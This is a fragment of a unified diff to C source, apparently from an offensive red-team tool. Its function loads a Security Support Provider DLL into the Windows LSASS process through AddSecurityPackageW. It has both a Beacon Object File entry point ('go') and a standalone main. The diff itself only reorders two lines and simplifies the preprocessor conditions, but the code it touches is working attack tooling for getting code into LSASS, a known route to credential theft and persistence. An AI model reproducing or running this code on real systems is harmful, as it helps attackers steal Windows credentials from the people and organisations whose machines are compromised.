@@ -16,8 +16,6 @@ void load_ssp(LPSTR ssp_path)
         PRINT_ERR("You must provide a full path: %s", ssp_path);
         return;
     }
-    DPRINT("Loading %s into " LSASS, ssp_path);
-    mbstowcs(ssp_path_w, ssp_path, MAX_PATH);
     // find the address of AddSecurityPackageW dynamically
     AddSecurityPackageW = (AddSecurityPackageW_t)get_function_address(
         get_library_address(SSPICLI_DLL, TRUE),
@@ -29,6 +27,8 @@ void load_ssp(LPSTR ssp_path)
         DPRINT_ERR("Address of 'AddSecurityPackageW' not found");
         return;
     }
+    mbstowcs(ssp_path_w, ssp_path, MAX_PATH);
+    DPRINT("Loading %s into " LSASS, ssp_path);
     SECURITY_PACKAGE_OPTIONS spo = {0};
     NTSTATUS status = AddSecurityPackageW(ssp_path_w, &spo);
     if (status == SEC_E_SECPKG_NOT_FOUND)
@@ -42,7 +42,7 @@ void load_ssp(LPSTR ssp_path)
     return;
 }
 
-#if defined(LOADER) && defined(BOF)
+#ifdef BOF
 
 void go(char* args, int length)
 {
@@ -55,7 +55,7 @@ void go(char* args, int length)
     load_ssp(ssp_path);
 }
 
-#elif defined(LOADER) && !defined(BOF)
+#else
 
 int main(int argc, char* argv[])
 {
